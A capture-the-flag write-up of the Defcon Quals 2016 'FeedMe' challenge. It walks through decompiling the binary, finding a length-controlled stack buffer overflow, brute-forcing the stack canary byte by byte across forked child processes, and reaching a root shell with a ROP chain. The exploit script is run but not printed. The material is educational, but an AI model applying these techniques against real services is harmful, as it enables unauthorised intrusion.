# Defcon Quals 2016 FeedMe

This is the information we get when we use ```checksec``` on the binary:

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

If we run the binary and input a large string, we get a ```stack smash``` error, which is weird since ```pwntools``` informed us there is no canary. We also notice that we don't actually exit but a ```child process``` is ended and we are allowed to input once again. We can make a good guess and say that another ```child process``` has been spawned.

```bash
[root@pwn:~/dcquals16_feedme]$ ./feedme 
FEED ME!
A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ATE 0a414141414141414141414141414141...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  
ATE 4141414141410a424242424242424242...
*** stack smashing detected ***: ./feedme terminated
Child exit.
FEED ME!
```

Looking through ```gdb``` using ```backtrace``` and through ```Ghidra``` searching for the string ```FEED ME!```, we can easily find the functions that spawn the ```child processes``` and also the function that takes our input.

```c
uint FUN_08049036(void)

{
  byte bVar1;
  undefined4 uVar2;
  uint uVar3;
  int in_GS_OFFSET;
  undefined buf [32];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  puts("FEED ME!");
  bVar1 = readByte();
  readBuf(buf,(uint)bVar1);
  uVar2 = FUN_08048f6e(buf,(uint)bVar1,0x10);
  FUN_0804f700("ATE %s\n",uVar2);
  uVar3 = (uint)bVar1;
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar3 = FUN_0806f5b0();
  }
  return uVar3;
}
```

And there is the stack canary! Since this is a static binary that is also stripped, our decompilation will look very messy. In such scenarious, you'd have to guess which functions are standard library functions and which are new ones, as to not waste time reversing a libc function. We can guess by what kind of arguments are used and by dynamic analysis. Also, looking at the type of data structure returned helps, as we will see.

First of all there's a call to a function that has ```"FEED ME!"``` as an argument. Since we actually output that on the screen, assuming that it is puts() is a pretty good guess. 

The next call is then made and its return value is assigned to ```byte bVar1;```, which means it will return one byte. And that's true, if we reverse that function, we will se that it reads one byte, typecasts it as unsigned integer and returns it. 

Following this, there's a call to which reads ```bVar1``` bytes from stdin and puts them on the stack. Well, this is a clear buffer overflow. Now we simply have to find the ```canary``` value and overwrite ```ret``` with our ```ropchain```.

To get the ```canary``` value, we will have to brute force it since there is no way to leak it. Since the byte on the lowest address of the canary will always be ```\x00```, we will need to brute force 3 bytes. Since ```child processes``` share the same canary value, we will do so without worrying about exiting the program since a new process will be spawned any time we fail. In order to brute force, we will have to adjust the length of overflow as to overflow 1 byte after ```\x00```, then 2, then 3. Finally, we need some kind of confirmation, which is present in the function that spawns the processes:

```c
  uVar1 = FUN_08049036(); // feedMe function
  FUN_0804f700("YUM, got %d bytes!\n",uVar1 & 0xff);
  return;
```

```bash
[root@gpwn:~/dcquals16_feedme]$ python expl.py 
[+] Starting local process './feedme': pid 18739
[*] 008afb66
[*] Switching to interactive mode

FEED ME!
ATE 41414141414141414141414141414141...
$ whoami
root
```